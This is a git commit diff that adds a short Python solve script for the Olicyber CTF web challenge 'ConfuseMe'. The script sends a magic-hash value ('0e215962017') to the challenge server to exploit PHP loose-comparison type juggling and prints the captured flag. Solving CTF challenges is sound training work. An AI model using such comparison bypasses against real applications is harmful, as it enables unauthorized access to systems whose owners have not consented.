4736f47b8e4cad462bef33026be59a165558ab28
Federico Bosio <federicobosio0209@gmail.com>
2025-10-13 21:28:36 +0200

    added confuse me

--- Olicyber/web/ConfuseMe/solve.py
+++ Olicyber/web/ConfuseMe/solve.py
@@ -1,1 +1,9 @@
-#0e215962017
+import requests
+import re
+
+URL = 'http://confuse-me.challs.olicyber.it/?input=0e215962017'
+
+r = requests.get(URL)
+flag = re.findall(r'flag\{.*?}', r.text)
+if flag:
+    print(flag[0])
